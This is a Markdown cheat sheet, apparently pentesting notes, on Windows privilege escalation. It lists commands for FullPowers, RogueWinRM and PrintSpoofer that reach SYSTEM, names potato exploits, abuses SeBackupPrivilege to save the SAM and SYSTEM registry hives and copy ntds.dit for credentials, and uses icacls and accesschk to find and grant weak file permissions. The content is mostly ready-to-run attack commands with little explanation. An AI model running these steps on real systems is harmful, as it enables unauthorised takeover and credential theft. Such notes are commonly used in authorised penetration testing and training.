# Windows Privilege

- [Windows Privilege](#windows-privilege)
  - [Service Account](#service-account)
    - [Service Privileges](#service-privileges)
    - [Privilege escalation - Enable `SeImpersonatePrivilege`/`SeAssignPrimaryToken`](#privilege-escalation---enable-seimpersonateprivilegeseassignprimarytoken)
    - [Privilege escalation - To `NT AUTHORITY\System`](#privilege-escalation---to-nt-authoritysystem)
  - [User Privilege](#user-privilege)
    - [Default Privilege](#default-privilege)
    - [Privilege exploitable](#privilege-exploitable)
      - [`SeImpersonatePrivilege` or `SeAssignPrimaryToken`](#seimpersonateprivilege-or-seassignprimarytoken)
      - [`SeBackupPrivilege`](#sebackupprivilege)
      - [`SeRestorePrivilege`](#serestoreprivilege)
  - [File Permissions](#file-permissions)
    - [Weak permissions - accesschk](#weak-permissions---accesschk)

## Service Account

Service Account:

- `nt authority\local service`
- `nt authority\network service`

### Service Privileges

```raw
nt authority\local service

Privilege Name          Description                               State
======================= ========================================= =======
SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
SeImpersonatePrivilege  Impersonate a client after authentication Enabled
```

### Privilege escalation - Enable `SeImpersonatePrivilege`/`SeAssignPrimaryToken`

```cmd
C:\ProgramData\FullPowers.exe -c cmd.exe
```

```raw
nt authority\local service

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

### Privilege escalation - To `NT AUTHORITY\System`

If winrm is disable:

```cmd
RogueWinRM.exe -p c:\Windows\System32\cmd.exe
```

```raw
nt authority\system
```

else

```cmd
PrintSpoofer.exe  -i -c cmd.exe
```

```raw
nt authority\system
```

## User Privilege

### Default Privilege

```raw
Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

### Privilege exploitable

#### `SeImpersonatePrivilege` or `SeAssignPrimaryToken`

- juicy-potato
- RogueWinRM (needs winrm disabled)
- SweetPotato
- PrintSpoofer

#### `SeBackupPrivilege`

Source: <https://github.com/giuliano108/SeBackupPrivilege>

```powershell
C:\scripts> reg save hklm\sam sam
C:\scripts> reg save hklm\system system

PS C:\scripts> Import-Module .\SeBackupPrivilegeUtils.dll
PS C:\scripts> Import-Module .\SeBackupPrivilegeCmdLets.dll
PS C:\scripts> Get-SeBackupPrivilege
PS C:\scripts> Copy-FileSeBackupPrivilege c:\Windows\NTDS\ntds.dit ntds.dit
```

#### `SeRestorePrivilege`

```text
Write access control to any file on the system, regardless of the files ACL.
```

## File Permissions

> Simple right

```raw
F (full access)
M (modify access)
RX (read and execute access)
R (read-only access)
W (write-only access)
```

> Read permission

```cmd
icacls FILE_OR_DIR
```

> Set Permissions

```cmd
icacls "FILE_OR_DIR" /grant USERNAME:PERMISSIONS
```

> Set Full Permissions

```text
icacls "FILE_OR_DIR" /grant USERNAME:F
```

### Weak permissions - accesschk

Group `Users`:

```cmd
accesschk64.exe -w -s -u -d "Users" "C:\Program Files"
accesschk64.exe -w -s -u -d "Users" "C:\Program Files (x86)"
accesschk64.exe -w -s -u -d "Users" "C:\Windows"
```

Permission of `Authenticated Users`:

```cmd
accesschk64.exe -w -s -u -d "Authenticated Users" "C:\Program Files"
accesschk64.exe -w -s -u -d "Authenticated Users" "C:\Program Files (x86)"
accesschk64.exe -w -s -u -d "Authenticated Users" "C:\Windows"
```

Permission of `Everyone`:

```cmd
accesschk64.exe -w -s -u -d "Everyone" "C:\Program Files"
accesschk64.exe -w -s -u -d "Everyone" "C:\Program Files (x86)"
accesschk64.exe -w -s -u -d "Everyone" "C:\Windows"
```
